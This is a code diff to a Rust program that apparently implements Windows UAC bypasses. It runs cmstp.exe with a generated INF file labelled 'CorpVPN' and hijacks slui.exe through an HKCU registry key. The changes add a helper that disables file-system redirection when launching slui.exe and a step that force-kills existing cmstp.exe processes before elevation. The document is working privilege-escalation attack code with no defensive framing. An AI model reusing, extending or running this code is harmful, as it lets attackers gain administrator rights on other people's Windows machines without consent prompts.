@@ -1,4 +1,7 @@
 #![windows_subsystem = "windows"]
+#[cfg(target_os = "windows")]
+mod fsr;
+use is_elevated::*;
 use std::env::args;
 use std::ffi::CString;
 use std::fs::File;
@@ -74,6 +77,20 @@ taskkill /IM cmstp.exe /F
 ServiceName="CorpVPN"
 ShortSvcName="CorpVPN"
 "#;
+#[cfg(target_os = "windows")]
+pub fn launch_with_fsr_disabled(program: &str) -> std::io::Result<()> {
+
+    // Guard disables FSR on creation and restores it on drop.
+    let _guard = fsr::DisableFsRedirection::new();
+
+    Command::new(program)
+        .stdout(Stdio::null())
+        .stderr(Stdio::null())
+        .spawn()?;
+
+    // `_guard` goes out of scope here → redirection is restored automatically.
+    Ok(())
+}
 
 pub fn generate_inf_file(command: &str) -> String {
     let temp_dir = "C:\\windows\\temp";
@@ -196,12 +213,8 @@ pub fn uac_slui(payload: &String) {
     }
 
     thread::sleep(Duration::from_secs(5));
-
     // 🔹 launch trigger
-    if let Err(e) = Command::new("slui.exe")
-        .stdout(Stdio::null())
-        .stderr(Stdio::null())
-        .spawn()
+    if let Err(e) = launch_with_fsr_disabled("slui.exe")
     {
         eprintln!("Failed to launch slui.exe: {}", e);
         let _ = delete_hkcu_key(path);
@@ -209,8 +222,17 @@ pub fn uac_slui(payload: &String) {
     }
 }
 
-pub fn elevate_uac(command: &String){
+pub fn elevate_uac(command: &String) {
+    // 🔹 kill any existing cmstp instances (best effort)
+    let _ = Command::new("taskkill")
+        .args(&["/IM", "cmstp.exe", "/F"])
+        .stdout(Stdio::null())
+        .stderr(Stdio::null())
+        .spawn();
+
+    // optional: small delay to ensure process is gone
+    std::thread::sleep(std::time::Duration::from_millis(500));
+
     let inf_file = self::generate_inf_file(&command);
     self::execute_cmstp(&inf_file);
 }
-
